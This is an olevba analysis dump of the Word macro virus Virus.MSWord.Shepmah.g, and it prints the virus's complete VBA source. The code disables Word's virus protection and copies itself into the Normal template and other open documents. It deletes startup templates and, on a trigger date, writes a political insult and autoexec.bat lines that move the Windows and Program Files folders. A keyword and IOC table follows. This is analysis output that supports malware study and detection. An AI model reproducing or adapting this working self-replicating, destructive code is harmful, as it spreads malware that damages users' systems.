olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shepmah.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shepmah.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO hampehs.bas 
in file: Virus.MSWord.Shepmah.g - OLE stream: 'Macros/VBA/hampehs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hampesh v1.0b
'Release : 12/10/1999
'Greeting to all lamerz!!
'Sneeky huh? Not sneeky enough! ;)=

'This one is dedicated to the biggest PUKIMAK in Malaysia
'Dato' Seri Dr. Mahathir Mohammed
Public Ushar_SB As Variant
Public Dah_Jumpe As Boolean
Public actDoc As Object

Function Go_DingDang()
Dim coprasmi As String
On Error Resume Next


coprasmi = "hampehs"
Check = 0

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

For chett = 1 To 2
If NormalTemplate.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
    ddSrc = ActiveDocument.FullName
    ddDest = NormalTemplate.FullName
    Check = 0
    Ushar_SB = NormalTemplate.VBProject.VBComponents.Item(2).Name
        Bunuh_SB ddDest
    Makan_Budak ddSrc, ddDest, coprasmi
End If
    
    If Dah_Jumpe = True Then
        ddDest = actDoc.FullName
        usharAct = actDoc
        SloSlo = actDoc
        ddSrc = NormalTemplate.FullName
    Else
        If ActiveDocument.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
            ddSrc = NormalTemplate.FullName
            ddDest = ActiveDocument.FullName
            usharAct = ddDest
            SloSlo = ActiveDocument
        Else: akuLerWoi = True
        End If
    End If
        If akuLerWoi = True Then GoTo pusin
            Ushar_SB = actDoc.VBProject.VBComponents.Item(2).Name
                Bunuh_SB ddDest
                Makan_Budak ddSrc, ddDest, coprasmi
            SloSlo.SaveAs FileName:=SloSlo.FullName
    
pusin:
coprasmi = "DingDang"
Next chett


End Function
Sub Bunuh_SB(Fail_SB)
    If Ushar_SB = "hampehs" Then GoTo tadak_sb
        Application.OrganizerDelete Fail_SB, Ushar_SB, wdOrganizerObjectProjectItems
tadak_sb:
End Sub
Sub Makan_Budak(Sos, Tuju, Stem)
On Error Resume Next
Set aplikasi = Application
aplikasi.OrganizerCopy Sos, Tuju, Stem, 3
If Check = 1 Then Set Desc = ActiveDocument Else Set Desc = NormalTemplate
Desc.VBProject.Description = "Hampehs [DD/UTM'99]"
End Sub
Sub AutoClose()
On Error Resume Next
WordBasic.disableautomacros False
Application.EnableCancelKey = wdCancelDisabled

Go_DingDang

End Sub
Sub autoexec()
'WordBasic.disableautomacros True
'AddIns.Unload False
End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled

Kill Application.StartupPath & "\*.dot"

Go_DingDang

If Documents.Count > 1 Then
    Dim bil
    For bil = 1 To Documents.Count
        If Documents(bil).Name <> ActiveDocument.Name Then
        Set actDoc = Documents(bil)
        Dah_Jumpe = True
        Go_DingDang
        End If
    Next
End If
Bunuh_Mahadet
End Sub

Sub Bunuh_Mahadet()
On Error Resume Next
If Dir("c:\dingdang.kri") <> "" Then GoTo memember
masa_membunuh = Now
hari = Day(masa_membunuh)
bulan = Month(masa_membunuh)

If hari = 25 And bulan = 2 Then

If Dir("c:\zalim.det") <> "" Then GoTo habihs

Open "C:\zalim.det" For Output As 1
Print #1, "===>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<===="
Print #1, "/\/\/\/\/\/\/\/\/\/\/\/\/\  ;)=  /\/\/\/\/\/\/\/\/\/\/\/\/"
Print #1, "Hidup ni memang  HAMPEHS kan? Dah tua-tua kena blajar lagi"
Print #1, "Mahathir  pun  memang  HAMPEHS. Memeningkan  kepala  semua"
Print #1, "Microsoft Word pun HAMPEHS jugak... Sebab ada macros bodoh"
Print #1, "     Tapi hidup tanpa HAMPEHS, ia  tak akan sempurna"
Print #1, "     Oleh itu, sedikit HAMPEHS dari kami kepada anda"
Print #1, "            Semoga hidup ini bertambah ceria!"
Print #1, ""
Print #1, "            HAMPEHS-HAMPEHS kan la diri anda!"
Print #1, "     Kerana nasib  semalam mungkin lebih bahagia...~"
Print #1, "                                               [DD/UTM'99]"
Print #1, "/\/\/\/\/\/\/\/\/\/\/\/\/\  ;(=  /\/\/\/\/\/\/\/\/\/\/\/\/"
Print #1, "===>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<===="
Close 1
Open "c:\autoexec.bat" For Append As 1
Print #1, "Rem -- Hampehs Wuz HERE! ;)="
Print #1, "echo off"
Print #1, "cls"
Print #1, "move /y progra~1 tempt1 > null"
Print #1, "move /y windows tempt2 > null"
Print #1, "cls"
Print #1, "type c:\zalim.det"
Print #1, "pause > null"
Print #1, "Rem -- The world full of Hampehs!"
Close 1

habihs:

CommandBars("Help").Controls("About Microsoft Word").Caption = "[Hampehs] by Dingdang"
CommandBars("Help").Controls("[Hampehs] by Dingdang").Enabled = False

DingDang.Show

memember:

End If
End Sub
Sub ToolsMacro()
On Error Resume Next
End Sub
Sub ViewVBCode()
On Error Resume Next
End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

